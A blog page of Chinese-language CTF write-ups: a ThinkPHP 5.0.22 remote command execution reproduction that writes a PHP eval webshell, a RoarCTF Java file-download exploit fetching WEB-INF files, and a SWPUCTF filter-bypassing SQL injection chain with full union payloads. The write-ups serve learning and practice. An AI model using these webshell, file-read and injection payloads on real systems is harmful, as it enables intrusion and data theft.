<p><img src="https://img-blog.csdnimg.cn/20200426175926466.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p><img src="https://img-blog.csdnimg.cn/20200426175850451.JPG" alt></p>
<p>4.把<code>ls /</code>换成<code>cat /flag</code>,获得最后的flag</p>
<p>5.提交flag</p>
<h2 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20200426175945856.JPG" alt></h2><p><strong>3.漏洞复现</strong></p>
<p>下载thinkphp5.0.22: <a href="http://www.thinkphp.cn/donate/download/id/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/donate/download/id/1260.html</a></p>
<p>通过phpstudy搭建环境，解压文件到WWW目录下</p>
<p>访问：localhost/thinkphp5.0.22/public</p>
<p>post传参 这里可以换成<code>echo 233</code>测试一下</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175958959.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>写入shell 换成 <code>echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt;shell.php</code></p>
<p>可以看到成功写入shell，用菜刀连接试试。能连上，说明写入shell成功了</p>
<p><img src="https://img-blog.csdnimg.cn/20200426180016596.JPG" alt></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/26/BUUCTF-old-hack/" data-id="cky6tqd6q0002swv9at2krw7w" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-RoarCTF2019-easy-Java" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/26/RoarCTF2019-easy-Java/" class="article-date">
  <time datetime="2020-04-26T11:21:58.538Z" itemprop="datePublished">2020-04-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/26/RoarCTF2019-easy-Java/">RoarCTF2019 easy Java</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Roar-CTF-2019-easy-Java"><a href="#Roar-CTF-2019-easy-Java" class="headerlink" title="[Roar CTF  2019] easy Java"></a>[Roar CTF  2019] easy Java</h1><hr>
<p><strong>1.尝试登录</strong></p>
<p>打开实例，首先出现了一个登录页面。考虑账号用admin，密码先尝试几个登录。提示wrong password，但是，这个页面的密码可以直接用暴力破解的方法得到。得出来用户名是admin，密码是admin888。</p>
<p>登录过去发现页面”flag is not here”,页面没有啥有用的信息，回到登录页面，发现有个help链接。进去，发先报错 “java.io.FileNotFoundException:{help.docx}”,意思是找不到help.docx这个文件。感觉这个提示没啥用，但既然提示这个文件，而且页面的URL是Download?file=help.docx。那就尝试下载help.docx这个文件。但是不知为何，get请求无法下载文件，只能通过post请求下载。</p>
<h2 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20200426175300859.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></h2><p><strong>2.寻找正确的文件</strong></p>
<p>打开help.docx结果没有什么有用的信息，不过我们可以判断这里是有文件包含漏洞的，这里需要找到合适文件。题目名已经告诉我们，这里可能和Java有关。这里就要用到Java web的有关知识了，这里需要了解一下Java web的文件结构：</p>
<pre><code>src/main/java: 这个目录一般是存放web项目的Java源文件的
src/main/resource: 这个目录一般是存放相关的配置文件
src/main/webapp: 这个目录一般是和web应用相关的
webapp下的文件目录是容易出现安全问题的
/WEB-INF/web.xml: Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则 
/WEB-INF/classes/：含了站点所有用的 class 文件(即编译后的Java文件)，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties：数据库配置文件</code></pre><p>这里就要尝试打开web.xml文件了。web.xml是我们需要研究的文件。之所以会发生安全漏洞就是因为如果在web.xml文件中有某个文件的相关映射的话，我们就可以直接在页面访问这个文件，就类似于文件包含了。从而发生安全漏洞。</p>
<hr>
<p><strong>3找到flag</strong></p>
<p>通过post请求下载web.xml文件 <code>payload：Download?filename=/WEB-INF/web.xml</code></p>
<p><img src="https://img-blog.csdnimg.cn/20200426175514555.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
 xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
 xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
 version=&quot;4.0&quot;&gt;

&lt;welcome-file-list&gt;
&lt;welcome-file&gt;Index&lt;/welcome-file&gt;
&lt;/welcome-file-list&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;/web-app&gt;</code></pre><p>可以看到有个servlet（运行在web服务器或应用服务器上的程序）为FlagController,这个是可能有flag的类，存放于com.wm.ctf包下。那么尝试下载这个类。构造payload：<code>Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code>(直接这样是不行，因为无法get请求。需要在Download页面下post请求传filename=/WEB-INF/classes/com/wm/ctf/FlagController.class)</p>
<p>打开class，发现一串有点像Base64编码的字符串</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175527989.JPG" alt></p>
<p>尝试一下Basse64解码，成功的得到了flag</p>
<p><img src="https://img-blog.csdnimg.cn/2020042617553933.JPG" alt></p>
<p>提交flag</p>
<p>这个题目其实结合了源码泄露，和文件包含以及Java web的基础知识。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/26/RoarCTF2019-easy-Java/" data-id="cky6tqd6w0006swv93io7l4s8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-SWPUCTF2019 web1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/25/SWPUCTF2019 web1/" class="article-date">
  <time datetime="2020-04-25T10:17:34.015Z" itemprop="datePublished">2020-04-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#[SWPUCTF 2019] web1</p>
<hr>
<p><strong>1.登录页面</strong></p>
<p>进来首先是个登录页面，一开始尝试用admin登录并用暴力破解得出密码，但是好像破解不出密码。看到下面有个注册页面，点开注册一个账号就可以登录了。登录后，点开广告申请，发现有点不对劲。一开始看到文本框，想到了xss,试过几个xss payload，发现应该和xss无关。。。想到sql注入，但不知道怎么构造绕过的payload。看了网上大佬的WP，学到了sql注入的新姿势，原来这是利用了无列名注入。</p>
<hr>
<p><strong>2.构造payload</strong></p>
<p>随便试了几个payload,发现order,and,or都被过滤了。空格也被过滤了。。。但是空格可以用/**/代替。and也可以用&amp;&amp;代替。那么先试试有几个字段。由于order被过滤了，没法用order by子句判断目标表的列数了。这里我就逐渐增加字段数，这样慢慢的发现竟然有22个字段,并且第2，3列是显示列</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>接下来就是老套路，查表，查列，查数据了。</p>
<p>首先爆数据库名，数据库名为web1</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>接下来爆表名</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&apos;web1&apos;/**/,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>但是information被过滤了，实际上是or被过滤了，导致order，or，information这些字都被过滤了。那怎么查到表名？在网上搜索才知道mysql在5.7版本之后还有一个sys系统表sys.schema_auto_increment_columns，作用和information_schema是相似的。</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns /**/where/**/table_schema=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;</code></pre><p>但是试了一下报错,页面说sys.schema_auto_increment_columns这个表不存在。但是根据刚才试列数是页面报的错才知道mysql.innodb_table_stats这个表也可以用，也类似于information_schema,这是这个表的详细使用信息：</p>
<p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p>
<p>那么重新构造payload：</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;</code></pre><p>查到有两个表ads,users。ads应该是和广告有关的，这里先试试users表</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>这里用到了子查询，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/25/SWPUCTF2019 web1/" data-id="cky6tqd6t0004swv99fj23ssj" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/01/09/Vue打包上传至Linux环境下Nginx服务器-1/">(no title)</a>
          </li>
        
          <li>
            <a href="/2020/11/06/JAVA处理JSON数据的实现与注意事项/">JAVA处理JSON数据的实现与注意事项</a>
          </li>
        
          <li>
            <a href="/2020/10/07/flutter与spring-boot交互获取session/">flutter与spring boot交互获取session</a>
          </li>
        
          <li>
            <a href="/2020/09/06/new-post/">new post</a>
          </li>
        
          <li>
            <a href="/2020/09/06/springboot分页-pageable作参数以及List转换为Page/">springboot分页 pageable作参数以及List转换为Page</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>